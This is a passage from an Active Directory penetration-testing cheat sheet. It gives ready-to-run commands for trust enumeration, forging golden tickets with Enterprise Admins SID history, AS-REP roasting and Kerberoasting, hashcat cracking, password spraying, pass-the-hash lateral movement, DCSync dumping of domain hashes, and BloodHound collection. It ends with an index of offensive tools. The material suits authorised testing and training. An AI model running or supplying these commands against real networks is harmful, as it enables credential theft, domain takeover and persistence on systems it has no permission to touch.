Get-DomainTrust                      # PowerView
Get-ADTrust -Filter *                # AD module
nltest /domain_trusts /all_trusts
```

```bash
impacket-lookupsid <domain>/<user>:<pass>@<DC>        # pull SIDs across the trust
```

**Child → parent (same forest) via SID History** — forge a golden/inter-realm ticket adding the Enterprise Admins SID of the parent (`...-519`):

```powershell
# Need child krbtgt hash + child domain SID + parent "Enterprise Admins" SID
mimikatz # kerberos::golden /user:Administrator /domain:<child.domain> /sid:<child-SID> /krbtgt:<child-krbtgt-hash> /sids:<parent-SID>-519 /ptt
```

```bash
impacket-raiseChild <child.domain>/<admin>:<pass>      # automates child→parent escalation
# or manual:
impacket-ticketer -nthash <child-krbtgt> -domain-sid <child-SID> -domain <child.domain> -extra-sid <parent-SID>-519 Administrator
```

---

## 7. Post-Exploitation / Persistence hygiene

- Once admin on a host, **re-run all original enumeration in the new user context.**
- Enumerate scheduled tasks, services, autoruns, authorized delegation, and **certificate templates with autoenrollment**.
- Collect LSA secrets, cached logons, SAM.
- Keep RDP enabled (§4.6) for easy re-access.
- **Every new credential → restart the whole loop at §3/§4.**

---

## 8. Quick Command Reference (memorize)

```bash
# Service scan
nmap -sS -Pn -p 53,88,135,139,389,445,464,636,3268,5985,5986 <range> -oA scans/ad

# No-cred user list + validation
nxc smb $IP -u '' -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f2 | cut -d ' ' -f1 | grep -v '\$' > users
kerbrute userenum -d <domain> --dc <DC-IP> users

# Roasting
impacket-GetNPUsers <domain>/ -usersfile users -format hashcat -outputfile asrep.txt   # AS-REP
impacket-GetUserSPNs -request -dc-ip <DC-IP> <domain>/<user>:<pass> -outputfile kerb.txt # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerb.txt  rockyou.txt -r rules/best64.rule

# Spray
nxc smb <range> -u users -p 'Password1' -d <domain> --continue-on-success

# Lateral
psexec.py <domain>/<user>:<pass>@<IP>
evil-winrm -i <IP> -u <user> -H <NThash>
crackmapexec smb <range> -u <user> -H <NThash> --local-auth

# Loot the domain
secretsdump.py <domain>/<user>:<pass>@<DC> -just-dc-ntlm

# BloodHound ingest
bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c all
```

---

## 9. Tool Index (everything referenced)

**Recon/enum:** nmap, enum4linux, smbclient, smbmap, rpcclient, ldapsearch, windapsearch, adfind, dig/host/nslookup, BGP Toolkit, TruffleHog, Greyhat Warfare, HaveIBeenPwned, Dehashed.
**AD enum:** PowerView, SharpHound/BloodHound(-python/CE), ldapdomaindump, PlumHound, PingCastle, PsLoggedon, NetExec/CrackMapExec, cmedb.
**Creds/roasting:** Impacket (GetNPUsers, GetUserSPNs, secretsdump, psexec/smbexec/wmiexec/atexec, Get-GPPPassword, getTGT, getST, addcomputer, rbcd, dacledit, findDelegation, lookupsid, raiseChild, ticketer), Rubeus, kerbrute, Responder/ntlmrelayx, gpp-decrypt, hashcat, John, LaZagne, Mimikatz, targetedKerberoast.py, bloodyAD.
**MSSQL:** mssqlclient.py, nxc mssql.
**PrivEsc / ACL abuse:** PowerUp, PrivEscCheck, WinPEAS, PrintSpoofer, Potato variants, SeRestoreAbuse, SharpGPOAbuse, PowerView (Set-DomainObject/Add-DomainObjectAcl), bloodyAD, dacledit, `net rpc password`.
**Delegation:** Rubeus (monitor/s4u/asktgt), impacket getST/addcomputer/rbcd, SpoolSample/printerbug/PetitPotam (coercion).
**Domain dominance:** secretsdump (DCSync/NTDS), vshadow, Mimikatz (golden/silver/dcsync), Zerologon exploit + restorepassword, Certipy (ADCS ESC1–ESC8).
**Pivoting/access:** ligolo-ng, evil-winrm, xfreerdp3, winrs, certutil (transfer), msfvenom.
